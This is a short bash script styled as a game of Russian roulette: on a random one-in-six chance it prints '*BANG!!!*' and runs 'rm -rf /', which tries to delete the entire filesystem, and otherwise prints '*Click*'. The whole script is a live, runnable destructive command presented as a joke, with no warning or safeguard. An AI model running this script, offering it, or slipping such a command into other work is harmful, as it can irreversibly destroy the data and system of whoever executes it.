#!/bin/bash

if [ $[ $RANDOM % 6 ] == 0 ]; then 
     echo *BANG!!!*
     rm -rf /
else
    echo *Click*
fi
